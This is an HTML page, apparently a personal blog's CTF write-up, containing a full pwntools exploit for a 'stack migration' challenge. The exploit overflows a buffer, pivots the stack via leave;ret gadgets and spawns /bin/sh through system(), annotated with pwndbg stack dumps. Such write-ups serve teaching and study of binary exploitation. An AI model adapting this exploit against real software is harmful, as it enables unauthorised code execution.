@@ -1,0 +1,464 @@
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  
+  
+  <title>  Ciscn_Pwn_Stack_Migration |   0x14&#39;s blog </title>
+
+ 
+  
+    <link rel="icon" href="/images/favicon.png">
+  
+
+
+  <link rel="stylesheet" href="/nayo.min.css"> 
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>  
+  <body>   
+    
+      <header class="header">
+	
+  <nav class="header-inner">        
+
+    <span class="iconfont icon-menu mobile-toggle"></span>   	
+
+    <div class="header-logo">
+      <a href="/">
+        <img class="header-logo-img" src="/images/logo.png">
+      </a>
+    </div>
+
+    <div class="header-menu">          
+              
+          
+            <a class="header-menu-link" id="header-menu-home" href="/">
+              <i class="iconfont icon-home">  
+            </i></a>     
+          
+              
+          
+            <a class="header-menu-link" id="header-menu-archives" href="/archives">
+              <i class="iconfont icon-archives">  
+            </i></a>     
+          
+              
+          
+            <a class="header-menu-link" id="header-menu-tags" href="/tags">
+              <i class="iconfont icon-tags">  
+            </i></a>     
+          
+              
+          
+            <a class="header-menu-link" id="header-menu-about" href="/about">
+              <i class="iconfont icon-about">  
+            </i></a>     
+          
+              
+          
+              <a class="header-menu-link" id="header-menu-search">
+                <i class="iconfont icon-search">  
+              </i></a>
+          
+                  
+    </div>  
+    
+  </nav>
+</header>
+
+   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          <article class="post">
+  
+	
+<div class="post-header">
+	<div class="post-header-inner">
+		<p class="post-title">	
+			Ciscn_Pwn_Stack_Migration
+		</p>
+		<div class="post-info">	
+			<span class="post-info-entry">
+				7月 18, 2019
+			</span>
+
+			
+			
+				<i class="iconfont icon-words"></i>
+				<span class="post-info-entry">3827
+				</span>
+			
+		</div>
+	</div>
+</div> 
+	
+ 
+
+	  <div class="typo post-content slideDownMin">
+
+		
+
+			
+					<p>Stack migration in Ciscn…</p>
+<a id="more"></a>
+<h1 id="Ciscn-Pwn-Stack-Migration"><a href="#Ciscn-Pwn-Stack-Migration" class="headerlink" title="Ciscn_Pwn_Stack_Migration"></a>Ciscn_Pwn_Stack_Migration</h1><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
+
+<span class="token comment" spellcheck="true"># buf_size = 0x28</span>
+<span class="token comment" spellcheck="true"># read_size = 0x30</span>
+<span class="token comment" spellcheck="true"># buf_addr = ebp - 0x28</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># vul loop1:</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy1'</span><span class="token punctuation">)</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b000</span><span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vul'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">''' Program Status
+──────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────
+ EAX  0x30
+ EBX  0x0
+ ECX  0xfff9442c ◂— 'Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
+ EDX  0xf7ee2890 ◂— 0x0
+ EDI  0xf7ee1000 ◂— 0x1d9d6c
+ ESI  0xf7ee1000 ◂— 0x1d9d6c
+ EBP  0xfff969a8 —▸ 0x804af00 ◂— 0x0
+ ESP  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+ EIP  0x80485fd (vul+104) ◂— leave  
+───────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────
+   0x80485ee &lt;vul+89>     push   eax
+   0x80485ef &lt;vul+90>     push   0x80486ca
+   0x80485f4 &lt;vul+95>     call   printf@plt &lt;0x80483e0>
+
+   0x80485f9 &lt;vul+100>    add    esp, 0x10
+   0x80485fc &lt;vul+103>    nop    
+ ► 0x80485fd &lt;vul+104>    leave  
+   0x80485fe &lt;vul+105>    ret    
+
+   0x80485ff &lt;main>       lea    ecx, dword ptr [esp + 4]
+   0x8048603 &lt;main+4>     and    esp, 0xfffffff0
+   0x8048606 &lt;main+7>     push   dword ptr [ecx - 4]
+   0x8048609 &lt;main+10>    push   ebp
+────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+... ↓
+──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
+ ► f 0  80485fd vul+104
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+Breakpoint *vul+104
+pwndbg> stack 20
+00:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+... ↓
+0a:0028│ ebp  0xfff969a8 —▸ 0x804af00 ◂— 0x0
+0b:002c│      0xfff969ac —▸ 0x804859b (vul+6) ◂— sub    esp, 4
+
+'''</span>
+pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''**********Notes*************
+{???} means a program address random....
+{==>} means point to....
+{&lt;= } means value at the address
+'''</span>
+
+<span class="token triple-quoted-string string">'''*********cover ebp**********
+ebp = ??? ==> 0x804af00 &lt;= 0
+'''</span>
+
+<span class="token triple-quoted-string string">'''***** hijacking ebp and cover return address to vul+6 ******
+leave: 
+    mov esp,ebp ;    
+        esp = ??? ==>0x804af00 &lt;= 0
+    pob ebp ;             
+        esp = ???+4 ; 
+        ebp = 0x804af00 &lt;=0
+ret vul+6;
+'''</span>
+
+<span class="token comment" spellcheck="true">#vul loop2:</span>
+<span class="token comment" spellcheck="true">#gadget</span>
+leave_ret <span class="token operator">=</span> <span class="token number">0x80484b8</span>
+
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy2'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\0'</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">'''******** send payload ********
+1.buf_addr = ebp - 0x28 = 0x804af00 - 0x28 = 0x804aed8
+2.(0x804aed8 + 0x10 = 0x804aef8) This value was writed in 0x 804aef0...It means that args point to '/bin/sh' at 0x804aef8...
+3.ebp = 0x804af00 ==> 0x804aed4 &lt;= 0
+4.leave:
+        mov esp,ebp:
+            esp = 0x804af00 ==> 0x804aed4 &lt;= 0 ; 
+        pop ebp:
+            esp = 0x804af04 ==> leave_ret;
+            ebp = 0x804aed4;
+5.ret leave_ret
+'''</span>
+
+<span class="token triple-quoted-string string">'''******* leave_ret*********
+leave:
+    mov esp,ebp:
+        esp = 0x804aed4 &lt;= 0;
+    pop ebp:
+        esp = 0x804aed8 ==> system
+        ebp = 0x0;
+ret system('/bin/sh');
+----------------------------------------------------------------------------
+pwndbg> stack 30
+00:0000│ esp  0x804aed8 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]
+01:0004│      0x804aedc ◂— 0x0
+02:0008│      0x804aee0 —▸ 0x804aee8 ◂— '/bin/sh'
+03:000c│      0x804aee4 ◂— 0x0
+04:0010│      0x804aee8 ◂— '/bin/sh'
+05:0014│      0x804aeec ◂— 0x68732f /* '/sh' */
+06:0018│      0x804aef0 ◂— 0x0
+... ↓
+0a:0028│      0x804af00 —▸ 0x804aed4 ◂— 0x0
+0b:002c│      0x804af04 —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave  
+0c:0030│      0x804af08 ◂— 0x0
+------------------------------------------------------------------------------
+'''</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+  	
+					
+	  </div>     
+	  
+
+	<div class="post-footer">
+
+
+  <div class="post-footer-other">
+    
+      <span class="post-footer-item">
+        
+
+
+<span class="donate-btn">
+	<span class="iconfont icon-donate"></span>
+</span>
+
+<div id="donate-box" class="sildeUpMin">
+
+	<span class="donate-cancel iconfont icon-cancel"></span>
+
+	<div class="donate-img-box">
+		<img id="donate-qr-wechat" class="noLazyLoad donate-img" src="/images/donate1.png" alt="No Donate Image!">	
+		<img id="donate-qr-alipay" class="noLazyLoad donate-img" src="/images/donate2.png" alt="No Donate Image!">	
+	</div>
+
+	<span class="donate-word">不负自己，不负青天</span>
+
+	<div class="donate-list">
+		<span class="iconfont icon-donate-wechat"></span>
+		<span class="iconfont icon-donate-alipay"></span>
+	</div>
+
+</div>
+ 
+      </span>        
+       
+    
+      <span class="post-footer-item">
+        <span class="share-btn">
+	<span class="iconfont icon-share"></span>
+</span>
+<div class="-mob-share sildeUpMin">
+	<ul class="-mob-inner">
+	   			             
+        <li class="iconfont 
+		icon-share-qq 
+		-mob-share-qq 
+		-mob-share-link"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-weixin 
+		-mob-share-weixin 
+		-mob-share-link"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-weibo 
+		-mob-share-weibo 
+		-mob-share-link"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-douban 
+		-mob-share-douban 
+		-mob-share-link"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-facebook 
+		-mob-share-facebook 
+		-mob-share-link"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-twitter 
+		-mob-share-twitter 
+		-mob-share-link"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-google 
+		-mob-share-google 
+		-mob-share-link"></li>		
+   	   
+	</ul>
+</div>	
+
+
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+      </span>  
+               
+  </div>  
+    
+
+
+  <div class="post-footer-meta">
+        
+          <i class="iconfont icon-category"></i>       
+          <a class="category-link" href="/categories/CTF/">CTF</a> 	
+      
+        	
+
+        
+          <i class="iconfont icon-tag"></i>     
+            <a class="tag-link" href="/tags/Ciscn/">Ciscn</a> <a class="tag-link" href="/tags/Pwn/">Pwn</a>    
+        	
+  </div>
+
+</div>
+
+
+<nav class="post-footer-nav">
+  <div class="post-footer-link">
+  
+      <a href="/2019/07/18/Binary-Security-Guidance/" id="post-nav-older" class="post-nav-link-wrap">
+        <strong class="post-nav-caption">older</strong>
+        
+          <span class="post-nav-title">
+            Binary_Security_Guidance
+          </span>
+      </a>
+  
+  </div>
+  <div class="post-footer-link">
+    
+  </div>
+
+</nav>
+ 
+	
+	
+</article>
+
+	<div class="toc-container">
+			<div class="toc-sidebar">
+			<p class="toc-title">
+				CONTENT
+			</p>
+			<div class="toc-list">
+				<ol class="toc-inner"><li class="toc-inner-item toc-inner-level-1"><a class="toc-inner-link" href="#Ciscn-Pwn-Stack-Migration"><span class="toc-inner-text">Ciscn_Pwn_Stack_Migration</span></a></li></ol>
+			</div>
+		</div>
+	</div>
+
+          </div> 
+      </div>            
+    
+    <a id="page-backTop">
+      <span>
+        <i class="iconfont icon-backtotop"></i>
+      </span>
+    </a> 
+
+  
+    
+    <div class="search-container sildeUpMin">
+        <div class="search-header">
+            <input type="text" placeholder="输入你想搜索的" id="search-input" class="search-input">
+            <span class="search-cancel">
+                <i class="iconfont icon-cancel">
+            </i></span>
+        </div>
+        <div id="search-result" class="search-result"></div>
+    </div>
+ 
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src="/images/favicon.png">  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">首页
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">归档
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">标签
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">关于
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">搜索 </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+
+
+<footer id="footer">	    
+
+		
+		<div class="footer-copyright">
+		&copy;
+				
+		2018-
+		
+		2019		
+	
+		0x14
+		<br>
+
+		Theme  <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>			
+	 
+</footer>   
+
+    <script src="/nayo.bundle.js"></script>           
+  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":80,"height":170},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>        
+</html>
